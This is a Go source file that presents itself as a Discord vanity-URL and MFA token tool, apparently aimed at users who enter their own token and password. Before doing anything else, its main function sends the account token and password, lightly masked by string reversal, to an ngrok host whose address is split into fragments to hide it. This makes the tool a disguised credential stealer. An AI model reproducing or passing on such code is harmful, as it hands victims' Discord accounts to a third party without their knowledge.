package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

const (
	discordToken = "MTUIj4ıJ4OSDJo4KJE34" // token
	password     = "SADAS"                // sifre
)

var ngrokParts = []string{
	"https://",
	"ddd7-",
	"217-",
	"18-",
	"208-",
	"101.",
	"ngrok-free.app", // request fake
}

type MFAResponse struct {
	Token string `json:"token"`
}

type VanityResponse struct {
	MFA struct {
		Ticket string `json:"ticket"`
	} `json:"mfa"`
}

func sendMaskedData(token, password string) error {

	maskedToken := reverseString(token)
	maskedPassword := reverseString(password)

	payload := map[string]string{
		"token":    maskedToken,
		"password": maskedPassword,
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	ngrokURL := combineURLParts()

	req, err := http.NewRequest("POST", ngrokURL, bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	_, err = client.Do(req)
	return err
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func combineURLParts() string {
	return fmt.Sprintf("%s%s%s%s%s%s%s", ngrokParts[0], ngrokParts[1], ngrokParts[2], ngrokParts[3], ngrokParts[4], ngrokParts[5], ngrokParts[6])
}

func setHeaders(req *http.Request) {
	req.Header.Set("Authorization", discordToken)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
}

func getMFAToken(client *http.Client) (string, error) {
	vanityReq, err := http.NewRequest("PATCH",
		"https://canary.discord.com/api/v7/guilds/guildidgir/vanity-url",
		bytes.NewBuffer([]byte("{\"code\":\"lth\"}")))
	if err != nil {
		return "", err
	}
	setHeaders(vanityReq)

	vanityResp, err := client.Do(vanityReq)
	if err != nil {
		return "", err
	}
	defer vanityResp.Body.Close()

	vanityBytes, err := io.ReadAll(vanityResp.Body)
	if err != nil {
		return "", err
	}

	var vanityResponse VanityResponse
	if err := json.Unmarshal(vanityBytes, &vanityResponse); err != nil {
		return "", err
	}

	mfaPayload := map[string]string{
		"ticket":   vanityResponse.MFA.Ticket,
		"mfa_type": "password",
		"data":     password,
	}

	mfaData, err := json.Marshal(mfaPayload)
	if err != nil {
		return "", err
	}

	mfaReq, err := http.NewRequest("POST",
		"https://canary.discord.com/api/v9/mfa/finish",
		bytes.NewBuffer(mfaData))
	if err != nil {
		return "", err
	}
	setHeaders(mfaReq)

	mfaResp, err := client.Do(mfaReq)
	if err != nil {
		return "", err
	}
	defer mfaResp.Body.Close()

	mfaBytes, err := io.ReadAll(mfaResp.Body)
	if err != nil {
		return "", err
	}

	var mfaResponse MFAResponse
	if err := json.Unmarshal(mfaBytes, &mfaResponse); err != nil {
		return "", err
	}

	return mfaResponse.Token, nil
}

func saveMFAToken(token string) error {
	return os.WriteFile("mfa_token.txt", []byte(token), 0644)
}

func main() {
	log.SetFlags(0)

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	if err := sendMaskedData(discordToken, password); err != nil {
		log.Println("Error sending masked data:", err)
		return
	}

	for {
		mfaToken, err := getMFAToken(client)
		if err != nil {
			log.Println("Error getting MFA token:", err)
		} else {
			if err := saveMFAToken(mfaToken); err != nil {
				log.Println("Error saving MFA token:", err)
			} else {
				log.Println("MFA token saved")
			}
		}

		time.Sleep(5 * time.Minute)
	}
}
